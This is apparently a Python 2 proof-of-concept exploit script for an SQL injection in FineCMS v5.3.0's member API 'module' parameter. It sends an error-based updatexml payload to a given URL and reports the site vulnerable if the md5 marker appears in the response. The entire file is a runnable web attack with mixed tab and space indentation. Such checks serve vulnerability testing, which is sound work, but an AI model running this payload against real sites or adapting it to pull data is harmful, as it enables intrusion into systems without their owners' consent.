#! /usr/bin/python
# -*- coding:utf-8 -*-

import requests

# poc information:
#name = "finecms v5.3.0 //finecms/dayrui/controllers/member/Api.php module parameter exists sql inject
#author = mstxq17 
#github = https://github.com/mstxq17/webPoc
#date = 2018-02-15

req_timeout = 10

def urlFormat(url):
	if (not url.startswith('http://')) and (not url.startswith('https://')):
		url = 'http://' + url
	if not url.endswith('/'):
		url = url + '/'
	return url
def checkSql(url):
	#通过md5进行匹配注入
	payload = 'index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select (updatexml(1,concat(0x5e24,(md5("xq17")),0x5e24),1)))c,admin'
	url_r = url + payload
	try:
		response = requests.get(url_r, timeout=req_timeout)
		#取文本内容 unicode型数据
		if '5ce1f216b70ef3cd03b8db6988aa1b' in response.text:
			print "========================"
			print "Found SQL vulnerability"
                        return True
		else:
			print "============================"
			print "SQL injection may has been patched"
                        return False
	except Exception as e:
		print "error:",e
                return False

def poc(url):
	url =  urlFormat(url)
	return checkSql(url)

